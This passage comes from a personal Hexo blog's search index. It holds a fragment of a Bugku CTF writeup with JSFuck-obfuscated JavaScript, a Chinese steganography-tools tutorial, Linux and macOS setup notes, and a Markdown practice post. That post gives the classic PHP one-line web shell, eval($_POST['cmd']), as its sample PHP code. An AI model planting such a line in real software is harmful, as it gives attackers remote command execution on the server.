]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])</span><br></pre></td></tr></table></figure>
<p>放进浏览器控制台</p>
<h2 id="sl"><a href="#sl" class="headerlink" title="sl"></a>sl</h2><p>php://filter</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
            <category> Writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> Bugku </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[隐写入门-工具篇]]></title>
      <url>/blog/public/2018/03/02/%E9%9A%90%E5%86%99%E5%85%A5%E9%97%A8-%E5%B7%A5%E5%85%B7%E7%AF%87</url>
      <content type="html"><![CDATA[<h1 id="CTF入门：隐写工具篇"><a href="#CTF入门：隐写工具篇" class="headerlink" title="CTF入门：隐写工具篇"></a>CTF入门：隐写工具篇</h1><blockquote>
<p>参考<a href="http://www.bugku.com/thread-56-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-56-1-1.html</a></p>
</blockquote>
<h2 id="0x01-Stegdetect"><a href="#0x01-Stegdetect" class="headerlink" title="0x01 Stegdetect"></a>0x01 Stegdetect</h2><p>Stegdetect程序主要用于分析<code>JPEG</code>文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息。</p>
<p>Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容。它运行静态测试以判断隐藏的内容是否存在。此外，它还会尝试识别隐藏内容是通过哪个隐写工具嵌入的。</p>
<p>Stegdetect的主要选项如下: </p>
<blockquote>
<ol>
<li>-q: 仅显示可能包含隐藏内容的图像</li>
<li>-n: 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</li>
<li>-s: 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</li>
<li>-d: 打印带行号的调试信息。</li>
<li>-t: 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：<br>-j: 检测图像中的信息是否是用jsteg嵌入的。<br>-o: 检测图像中的信息是否是用outguess嵌入的。<br>-p: 检测图像中的信息是否是用jphide嵌入的。<br>-i: 检测图像中的信息是否是用invisible secrets嵌入的。</li>
</ol>
</blockquote>
<p><strong>MacOS上安装</strong><br>请见：<a href="https://github.com/sokie/stegdetect" target="_blank" rel="noopener">https://github.com/sokie/stegdetect</a></p>
<h2 id="0x02-outguess"><a href="#0x02-outguess" class="headerlink" title="0x02 outguess"></a>0x02 outguess</h2><p>执行以下命令解密：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ outguess -r ‘/root/Desktop/angrybird.jpg’ -t 11.txt</span><br></pre></td></tr></table></figure></p>
<p><strong>MacOS上安装</strong><br>下载自<a href="https://github.com/crorvick/outguess.git" target="_blank" rel="noopener">https://github.com/crorvick/outguess.git</a><br>修改configure文件，将安装目录前缀设置为期望地址。</p>
<h2 id="0x03-mp3stego"><a href="#0x03-mp3stego" class="headerlink" title="0x03 mp3stego"></a>0x03 mp3stego</h2><p>主要用于mp3隐写<br>使用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line">$ decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-binwalk-dd-foremost命令"><a href="#0x04-binwalk-dd-foremost命令" class="headerlink" title="0x04 binwalk, dd, foremost命令"></a>0x04 binwalk, dd, foremost命令</h2><p><strong>binwalk</strong><br>主要用于分析隐写文件<br>使用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk baozou_new.jpg</span><br><span class="line">DECIMAL       HEX           DESCRIPTION</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0             0x0           JPEG image data, JFIF standard  </span><br><span class="line">1.014308      0x10D4        Zip encrypted archive data, at least v2.0 to extract, compressed size: 8890,  uncompressed size: 9990, name: <span class="string">"qr.png"</span>  </span><br><span class="line">可以看出 0x10D4位置后是zip文件。</span><br></pre></td></tr></table></figure></p>
<p><strong>MacOS上安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install binwalk</span><br></pre></td></tr></table></figure></p>
<p><strong>dd</strong><br>主要用于提取文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=baozou_new.jpg of=2.zip bs=1 skip=4308</span><br><span class="line">9065+0 records <span class="keyword">in</span></span><br><span class="line">9065+0 records out</span><br><span class="line">9065 bytes (9.1 kB) copied, 0.0475933 s, 190 kB/s</span><br></pre></td></tr></table></figure></p>
<p><strong>安装</strong><br>系统自带</p>
<p><strong>foremost</strong><br>foremost命令同样可以达到效果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -v -i baozou_new.jpg -o /root/Desktop/xx</span><br></pre></td></tr></table></figure></p>
<p>支持恢复如下格式：avi, bmp, dll, doc, exe, gif, htm, jar, jpg, mbd, mov, mpg, pdf, png, ppt, rar, rif, sdw, sx, sxc, sxi,sxw, vis, wav, wmv, xls, zip。<br><strong>MacOS上安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install foremost</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-F5-steganography"><a href="#0x05-F5-steganography" class="headerlink" title="0x05 F5-steganography"></a>0x05 F5-steganography</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/matthewgao/F5-steganography</span><br><span class="line">$ <span class="built_in">cd</span> F5-steganography</span><br><span class="line">$ java Extract ../123456.jpg -p 123456</span><br></pre></td></tr></table></figure>
<p>后会生成output.txt文件，里面就有flag了</p>
<h2 id="0x06-steghide"><a href="#0x06-steghide" class="headerlink" title="0x06 steghide"></a>0x06 steghide</h2><p>官网地址：<a href="http://steghide.sourceforge.net/documentation.php" target="_blank" rel="noopener">http://steghide.sourceforge.net/documentation.php</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在文件中隐藏数据</span></span><br><span class="line">$ steghide –embed -cf /root/Desktop/1111.jpg -ef /root/Desktop/embeddate</span><br><span class="line"><span class="comment"># 检查图片中隐藏的信息</span></span><br><span class="line">$ steghide info /root/Desktop/1111.jpg</span><br><span class="line">$ steghide extract -sf background.jpg</span><br></pre></td></tr></table></figure></p>
<p><strong>MacOS上安装</strong><br>没有安装上</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
            <category> 隐写 </category>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 隐写 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[虚拟机中调整Ubuntu Server分辨率]]></title>
      <url>/blog/public/2018/01/24/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E8%B0%83%E6%95%B4Ubuntu-Server%E5%88%86%E8%BE%A8%E7%8E%87</url>
      <content type="html"><![CDATA[<blockquote>
<p>引自：<a href="http://blog.csdn.net/weilanxing/article/details/7664324" target="_blank" rel="noopener">调整虚拟机中Ubuntu Server 屏幕分辨率</a></p>
</blockquote>
<ol>
<li>打开grub文件:<br><code>$ sudo vi /etc/default/grub</code> </li>
<li>修改参数GRUB_CMDLINE_LINUX的值:<br><code>GRUB_CMDLINE_LINUX=&quot;vga=0x317&quot;</code><br>参数值参考下图：</li>
</ol>
<table>
<thead>
<tr>
<th>显存</th>
<th>640x480</th>
<th>800x600</th>
<th>1024x768</th>
<th>1280x1024</th>
</tr>
</thead>
<tbody>
<tr>
<td>256</td>
<td>0x301</td>
<td>0x303</td>
<td>0x305</td>
<td>0x307</td>
</tr>
<tr>
<td>32k</td>
<td>0x310</td>
<td>0x313</td>
<td>0x316</td>
<td>0x319</td>
</tr>
<tr>
<td>64k</td>
<td>0x311</td>
<td>0x314</td>
<td>0x317</td>
<td>0x31A</td>
</tr>
<tr>
<td>16M</td>
<td>0x312</td>
<td>0x315</td>
<td>0x318</td>
<td>0x31B</td>
</tr>
</tbody>
</table>
<ol>
<li><p><code>$ sudo update-grub</code></p>
</li>
<li><p><code>$ sudo reboot</code></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Ubuntu Server </category>
            
            <category> 配置 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Ubuntu Server </tag>
            
            <tag> 分辨率调整 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何在centOS上开启EPEL仓库]]></title>
      <url>/blog/public/2018/01/24/%E5%A6%82%E4%BD%95%E5%9C%A8centOS%E4%B8%8A%E5%BC%80%E5%90%AFEPEL%E4%BB%93%E5%BA%93</url>
      <content type="html"><![CDATA[<p><img src="https://tecmint.com/wp-content/uploads/2012/06/Install-Epel-in-Linux1.jpg" alt="图片"></p>
<blockquote>
<p>引自：<a href="https://www.tecmint.com/how-to-enable-epel-repository-for-rhel-centos-6-5/" target="_blank" rel="noopener">How to Enable EPEL Repository for RHEL/CentOS 7.x/6.x/5.x</a></p>
</blockquote>
<h2 id="0x01-什么是EPEL"><a href="#0x01-什么是EPEL" class="headerlink" title="0x01 什么是EPEL"></a>0x01 什么是EPEL</h2><p>EPEL (Extra Packages for Enterprise Linux) 是一个Fedora团队提供的开源的基于免费社区的代码仓库项目。Fedora团队为Linux发行版（RHEL，CentOS，Scientific Linux）提供高质量的软件包。Epel本身并不是RHEL或者CentOS的一部分，但是他为这些发行版Linux提供了很多开源软件包，在网络、系统管理、编程、监控方面都有设计。多数的epel包由Fedora repo维护。</p>
<h2 id="0x02-为什么要使用EPEL"><a href="#0x02-为什么要使用EPEL" class="headerlink" title="0x02 为什么要使用EPEL"></a>0x02 为什么要使用EPEL</h2><ul>
<li>EPEL提供了很多可以通过yum安装的开源软件包。</li>
<li>EPEL完全开源免费。</li>
<li>没有兼容性问题。</li>
<li>所有的包都由Fedora repo维护。</li>
</ul>
<h2 id="0x03-如何在RHEL-CentOS-7-x-6-x-5-x上开启EPEL-repo"><a href="#0x03-如何在RHEL-CentOS-7-x-6-x-5-x上开启EPEL-repo" class="headerlink" title="0x03 如何在RHEL/CentOS 7.x/6.x/5.x上开启EPEL repo"></a>0x03 如何在RHEL/CentOS 7.x/6.x/5.x上开启EPEL repo</h2><p>首先，使用wget下载epel相关文件，在使用RPM开启EPEL repo。<br>根据个人系统型号选用下面一种方法（应使用root账户）。</p>
<h3 id="RHEL-CentOS-7-64-Bit"><a href="#RHEL-CentOS-7-64-Bit" class="headerlink" title="RHEL/CentOS 7 64 Bit"></a>RHEL/CentOS 7 64 Bit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## RHEL/CentOS 7 64-Bit ##</span><br><span class="line"># wget http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line"># rpm -ivh epel-release-latest-7.noarch.rpm</span><br></pre></td></tr></table></figure>
<h3 id="RHEL-CentOS-6-32-64-Bit"><a href="#RHEL-CentOS-6-32-64-Bit" class="headerlink" title="RHEL/CentOS 6 32-64 Bit"></a>RHEL/CentOS 6 32-64 Bit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">## RHEL/CentOS 6 32-Bit ##</span><br><span class="line"># wget http://dl.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm</span><br><span class="line"># rpm -ivh epel-release-6-8.noarch.rpm</span><br><span class="line"></span><br><span class="line">## RHEL/CentOS 6 64-Bit ##</span><br><span class="line"># wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</span><br><span class="line"># rpm -ivh epel-release-6-8.noarch.rpm</span><br></pre></td></tr></table></figure>
<h2 id="0x04-如何确认repo已经启用"><a href="#0x04-如何确认repo已经启用" class="headerlink" title="0x04 如何确认repo已经启用"></a>0x04 如何确认repo已经启用</h2><p>运行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum repolist</span><br></pre></td></tr></table></figure></p>
<p>样例输出：</p>
<pre>    Loaded plugins: downloadonly, fastestmirror, priorities
    Loading mirror speeds from cached hostfile
    * base: centos.aol.in
    * epel: ftp.cuhk.edu.hk
    * extras: centos.aol.in
    * rpmforge: be.mirror.eurid.eu
    * updates: centos.aol.in
    Reducing CentOS-5 Testing to included packages only
    Finished
    1469 packages excluded due to repository priority protections
    repo id                           repo name                                                          status
    base                              CentOS-5 - base                                                   2,718+7
    <font color="#FF0000">epel Extra Packages for Enterprise Linux 5 - i386 4,320+1,408</font>
    extras                            CentOS-5 - extras                                                  229+53
    rpmforge                          Red Hat Enterprise 5 - RPMforge.net - dag                          11,251
    repolist: 19,075
</pre>

<h2 id="0x05-如何使用EPEL-repo"><a href="#0x05-如何使用EPEL-repo" class="headerlink" title="0x05 如何使用EPEL repo"></a>0x05 如何使用EPEL repo</h2><p>使用<code>yum</code>命令搜索安装软件包。比如我们在epel repo中搜索Zabbix包，让我们来看看它是否在epel中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum --enablerepo=epel info zabbix</span><br></pre></td></tr></table></figure></p>
<p>样例输出：</p>
<p><pre>    Available Packages<br>    Name       : zabbix<br>    Arch       : i386<br>    Version    : 1.4.7<br>    Release    : 1.el5<br>    Size       : 1.7 M<br>    <font color="red">Repo : epel</font><br>    Summary    : Open-source monitoring solution for your IT infrastructure<br>    URL        : <a href="http://www.zabbix.com/" target="_blank" rel="noopener">http://www.zabbix.com/</a><br>    License    : GPL<br>    Description: ZABBIX is software that monitors numerous parameters of a network.<br></pre><br>然后我们就可以利用epel repo选项<code>–enablerepo=epel</code>安装<code>Zabbix</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum --enablerepo=epel install zabbix</span><br></pre></td></tr></table></figure></p>
<p><strong>注意！</strong> EPEL配置文件在目录：<code>/etc/yum.repos.d/epel.repo</code>。</p>
<p>这样你就可以通过epel安装很多高质量应用了。</p>
]]></content>
      
        <categories>
            
            <category> centOS </category>
            
            <category> repo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> centOS </tag>
            
            <tag> EPEL repo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MacOS上U盘分区]]></title>
      <url>/blog/public/2018/01/24/MacOS%E4%B8%8AU%E7%9B%98%E5%88%86%E5%8C%BA</url>
      <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ diskutil partitionDisk /dev/disk2 3 MS-DOS DOS 20G ExFAT linux_kali_1 20G ExFAT linux_kali_2 24G</span><br></pre></td></tr></table></figure>
<p>在使用前需要知道自己的U盘设备号，比如<code>/dev/disk2</code>，紧接着的数字是分区数目，然后是格式、分区名称、分区大小。<br>利用<code>diskutil list</code>查看磁盘设备。</p>
<p>P.S.<br>笔者设备：<br><strong>macOS</strong> High Sierra 10.13.2<br>MacBook Pro(15-inch, 2016)</p>
]]></content>
      
        <categories>
            
            <category> Mac使用 </category>
            
            <category> 磁盘工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MacOS </tag>
            
            <tag> U盘分区 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mac-pip-install]]></title>
      <url>/blog/public/2018/01/23/mac-pip-install</url>
      <content type="html"><![CDATA[<p>MacOS系统中pip install 时常出现<code>Permission Denied</code>的情况，可以采用以下方式解决问题。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install --user &lt;package name&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以在安装python模块时按情况使用<code>--upgrade --ignore-installed</code>选项。</p>
]]></content>
      
        <categories>
            
            <category> Coding </category>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MacOS </tag>
            
            <tag> Python </tag>
            
            <tag> pip install </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Begin]]></title>
      <url>/blog/public/2018/01/23/Begin</url>
      <content type="html"><![CDATA[<p>Glad to be here! I’m writing this for practicing using markdown to write my articles.<br>This site is <a href="http://ainassine.top/blog/public" target="_blank" rel="noopener">Ainassine’s Blog</a>, Welcome here.<br>I’m using Hexo framework with theme next.muse. It dose support many lables to help you write you own articles, but I want to get used to MD first.</p>
<h2 id="Practice-some-techniques"><a href="#Practice-some-techniques" class="headerlink" title="Practice some techniques"></a>Practice some techniques</h2><h3 id="About-code"><a href="#About-code" class="headerlink" title="About code"></a>About code</h3><p>How to use <code>scanf()</code> in C?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash code</span></span><br><span class="line">$ sudo chown 777 a.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java code</span></span><br><span class="line">System.out.println(<span class="string">"Hello world!"</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C code</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello world!"</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ code</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello world!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python code</span></span><br><span class="line">print(<span class="string">'Hello world!'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript code</span></span><br><span class="line">&lt;script&gt; alert(<span class="string">"Hello world!"</span>); &lt;/scirpt&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PHP code</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="About-font"><a href="#About-font" class="headerlink" title="About font"></a>About font</h3><p>Italic: <em>Hello world!</em></p>
<p>Bold: <strong>Hello world!</strong></p>
<p>Bold and Italic: <strong><em>Hello world!</em></strong></p>
<p>Deleted: <del>Hello world!</del></p>
<h3 id="About-links"><a href="#About-links" class="headerlink" title="About links"></a>About links</h3><p>Link for this blog: <a href="http://ainassine.top/blog/public" title="Ainassine&#39;s Blog" target="_blank" rel="noopener">Ainassine’s Blog</a></p>
<p>For reference: Great search engines are as follows: <a href="https://www.baidu.com" title="baidu" target="_blank" rel="noopener">Baidu</a>, <a href="https://bing.cn" title="bing" target="_blank" rel="noopener">Bing</a> and <a href="https://www.google.com" title="google" target="_blank" rel="noopener">Google</a>, <a href="https://www.google.com" title="google" target="_blank" rel="noopener">Google</a> is good.</p>
<p>Use ‘&lt;’ and ‘&gt;’ to make links be seen as links: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#106;&#111;&#x65;&#101;&#101;&#x65;&#x65;&#64;&#x65;&#120;&#109;&#97;&#112;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;">&#106;&#111;&#x65;&#101;&#101;&#x65;&#x65;&#64;&#x65;&#120;&#109;&#97;&#112;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;</a></p>
<p>This is a anchor: Jump to <a href="#About-code">About Code</a></p>
<h3 id="About-list"><a href="#About-list" class="headerlink" title="About list"></a>About list</h3><p>Disordered list (use *, - or + to denote): </p>
<ul>
<li>hhh 1</li>
<li>ggg 2</li>
<li>jjj 3</li>
</ul>
<p>Ordered list (user nubmer with a . to denote):</p>
<ol>
<li>Firstly</li>
<li>Secondly</li>
<li>Thirdly</li>
</ol>
<p>For reference: </p>
<ul>
<li>Test quote:<blockquote>
<p>test 1<br>test 2</p>
</blockquote>
</li>
</ul>
<p>Two paragraphs of reference:</p>
<blockquote>
<p>Title of it<br>content 1 for paragraph 1<br>content 2 for paragraph 1</p>
<p>content 1 for paragraph 2<br>content 2 for paragraph 2</p>
</blockquote>
<p>Mixure:</p>
<blockquote>
<ol>
<li>list item 1</li>
<li>list item 2</li>
</ol>
<p>exmaple code<br><code>printf(&#39;hello world!&#39;);</code></p>
</blockquote>
<h3 id="About-pictures"><a href="#About-pictures" class="headerlink" title="About pictures"></a>About pictures</h3><p>Pic 1:<br><img src="https://gss1.bdstatic.com/9vo3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=7d0adc225edf8db1a8237436684ab631/728da9773912b31b913b10938618367adab4e131.jpg" alt="Pic 1" title="Pic 1"></p>
<h3 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h3><table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>分数</th>
</tr>
</thead>
<tbody>
<tr>
<td>小明</td>
<td>男</td>
<td>75</td>
</tr>
<tr>
<td>小红</td>
<td>女</td>
<td>100</td>
</tr>
<tr>
<td>小陆</td>
<td>男</td>
<td>92</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>产品</th>
<th style="text-align:right">价格</th>
</tr>
</thead>
<tbody>
<tr>
<td>Leanote 高级账号</td>
<td style="text-align:right">60元/年</td>
</tr>
<tr>
<td>Leanote 超级账号</td>
<td style="text-align:right">120元/年</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> Markdown </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> My blog </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/blog/public/2017/11/27/hello-world</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
